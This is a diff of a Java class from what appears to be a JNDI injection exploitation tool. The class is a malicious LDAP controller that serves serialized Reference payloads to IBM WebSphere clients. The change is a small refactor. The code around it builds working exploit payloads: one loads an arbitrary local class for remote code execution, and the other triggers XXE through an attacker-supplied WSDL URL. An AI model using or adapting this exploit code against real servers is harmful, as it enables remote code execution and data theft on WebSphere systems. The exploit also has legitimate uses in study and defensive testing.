@@ -36,25 +36,25 @@ public class WebsphereBypassController implements LdapController {
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
+        Reference ref;
         if(actionType == WebsphereActionType.rce){
             //prepare a payload that leverages arbitrary local classloading in com.ibm.ws.client.applicationclient.ClientJMSFactory
-            Reference ref = new Reference("ExportObject",
+            ref = new Reference("ExportObject",
                     "com.ibm.ws.client.applicationclient.ClientJ2CCFFactory", null);
             Properties refProps = new Properties();
             refProps.put("com.ibm.ws.client.classpath", localJarPath);
             refProps.put("com.ibm.ws.client.classname", "xExportObject");
 //            ref.add(new com.ibm.websphere.client.factory.jdbc.PropertiesRefAddrropertiesRefAddr("JMSProperties", refProps));
-            e.addAttribute("javaSerializedData", Util.serialize(ref));
 
         }else{
             //prepare payload that exploits XXE in com.ibm.ws.webservices.engine.client.ServiceFactory
-            javax.naming.Reference ref = new Reference("ExploitObject",
+            ref = new Reference("ExploitObject",
                     "com.ibm.ws.webservices.engine.client.ServiceFactory", null);
             ref.add(new StringRefAddr("WSDL location", injectUrl));
             ref.add(new StringRefAddr("service namespace","xxx"));
             ref.add(new StringRefAddr("service local part","yyy"));
-            e.addAttribute("javaSerializedData", Util.serialize(ref));
         }
+        e.addAttribute("javaSerializedData", Util.serialize(ref));
 
         result.sendSearchEntry(e);
         result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
@@ -89,7 +89,7 @@ public class WebsphereBypassController implements LdapController {
                     int thirdIndex = base.indexOf("/", secondIndex + 1);
                     if(thirdIndex < 0) thirdIndex = base.length();
 
-                    PayloadType payloadType = null;
+                    PayloadType payloadType;
                     try{
                         payloadType = PayloadType.valueOf(base.substring(secondIndex + 1, thirdIndex).toLowerCase());
                         // webspherebypass 只支持这 4 种类型的 PayloadType
